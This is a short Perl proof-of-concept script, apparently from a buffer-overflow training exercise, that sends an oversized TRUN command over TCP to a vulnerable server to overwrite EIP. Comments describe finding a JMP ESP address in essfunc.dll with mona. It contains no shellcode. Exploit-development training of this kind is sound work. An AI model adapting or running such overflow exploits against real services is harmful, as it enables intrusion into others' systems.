#!/usr/bin/perl
#
#
use IO::Socket;

if (@ARGV < 2) {
	die("Usage: $0 IP_ADDRESS PORT\n\n");
}

$size = 2003;
$header = "TRUN /.:/";			# data header
$ebp = "\x41" x $size;			# \x41 == 'A'
$eip = "\x42" x 4;			# \x42 == 'B'
$esp = "\x43" x (3000 - 2007); 		# \x43 == 'C'
$custom_pattern = $header.$ebp.$eip.$esp;	# eip will be set 42424242

# if we use immunity debugger, we can use moma comamnd ==> essfunc.dll
# !mona modules          ==> find out the modules we are running
# use msf-nasm_shell  comamnd, input << JMP ESP >>, It will return hex code ==> FFE4
# !mona find -s "\xff\xe4" -m essfunc.dll	==> It's will return a lot of results, we use the top address 0x625011AF
# 

$socket = IO::Socket::INET->new (
	Proto => "tcp",
	PeerAddr => "$ARGV[0]",	
	PeerPort => "$ARGV[1]"
) or die "Cannot connect to $ARGV[0]:$ARGV[1]";

$socket->recv($serverdata, 1024);
print "$serverdata";
$socket->send($custom_pattern);

# send buffer
# $socket->send($baddata);
